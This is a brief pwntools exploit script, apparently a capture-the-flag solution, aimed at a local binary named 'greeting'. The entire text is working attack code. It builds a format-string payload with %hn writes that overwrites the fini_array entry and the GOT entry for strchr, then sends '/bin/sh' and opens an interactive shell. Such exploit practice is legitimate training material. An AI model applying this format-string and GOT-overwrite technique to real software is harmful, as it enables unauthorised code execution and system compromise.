from pwn import *

filename = './greeting'
r = process(filename)
e = ELF(filename)
payload = 'AA'
payload += p32(e.symbols['__do_global_dtors_aux_fini_array_entry'])
payload += p32(e.got['strchr'])
payload += p32(e.got['strchr'] + 2)
payload += '%34253c'
payload += '%12$hn'
payload += '%65187c'
payload += '%13$hn'
payload += '%33652c'
payload += '%14$hn'

r.sendlineafter("name... ", payload)
r.sendline("/bin/sh")
r.interactive()